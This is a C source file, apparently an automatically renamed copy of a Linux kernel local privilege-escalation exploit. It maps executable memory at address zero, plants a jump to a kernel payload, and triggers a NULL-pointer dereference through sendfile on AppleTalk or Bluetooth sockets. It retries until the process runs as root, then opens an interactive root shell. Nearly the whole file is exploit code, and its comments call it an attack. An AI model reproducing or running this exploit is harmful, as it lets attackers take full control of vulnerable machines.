#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int MAP_ANONYMOUS ; 
 void* MAP_FAILED ; 
 int MAP_FIXED ; 
 int MAP_PRIVATE ; 
 int /*<<< orphan*/  O_RDONLY ; 
 scalar_t__ PER_SVR4 ; 
 int /*<<< orphan*/  PF_APPLETALK ; 
 int /*<<< orphan*/  PF_BLUETOOTH ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 scalar_t__ FUNC4 () ; 
 int /*<<< orphan*/  gid ; 
 int /*<<< orphan*/  kernel ; 
 void* FUNC5 (int,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC6 (int,int,int) ; 
 int FUNC7 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 scalar_t__ FUNC9 (int) ; 
 int FUNC10 (int,int,int*,int) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ uid ; 

int FUNC12(int argc,char *argv[])
{
	int fd_in=0,fd_out=0,offset=1;
	void *zero_page;

	uid=FUNC4();
	gid=FUNC3();
	if(uid==0){
		FUNC2(stderr,"[-] check ur uid\n");
		return -1;
	}

	/*
	** There are some cases that we need mprotect due to the dependency matter with SVR4. (however, I did not confirm it yet)
	*/
	if(FUNC9(0xffffffff)==PER_SVR4){
		if(FUNC6(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)==-1){
			FUNC8("[-] mprotect()");
			return -1;
		}
	}
	else if((zero_page=FUNC5(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0))==MAP_FAILED){
			FUNC8("[-] mmap()");
			return -1;
	}
	*(char *)0x00000000=0xff;
	*(char *)0x00000001=0x25;
	*(unsigned long *)0x00000002=(unsigned long)&kernel;
	*(char *)0x00000006=0xc3;

	if((fd_in=FUNC7(argv[0],O_RDONLY))==-1){
		FUNC8("[-] open()");
		return -1;
	}
	if((fd_out=FUNC11(PF_APPLETALK,SOCK_DGRAM,0))==-1){
		if((fd_out=FUNC11(PF_BLUETOOTH,SOCK_DGRAM,0))==-1){
			FUNC8("[-] socket()");
			return -1;
		}
	}
gogossing:
	/*
	** Sometimes, the attacks can fail. To enlarge the possiblilty of attack,
	** an attacker can make all the processes runing under current user uid 0.
	*/
	if(FUNC10(fd_out,fd_in,&offset,2)==-1){
		if(offset==0){
			FUNC8("[-] sendfile()");
			return -1;
		}
		FUNC0(fd_out);
		fd_out=FUNC11(PF_BLUETOOTH,SOCK_DGRAM,0);
	}
	if(FUNC4()==uid){
		if(offset){
			offset=0;
		}
		goto gogossing; /* all process */
	}
	FUNC0(fd_in);
	FUNC0(fd_out);

	FUNC1("/bin/sh","sh","-i",NULL);
	return 0;
}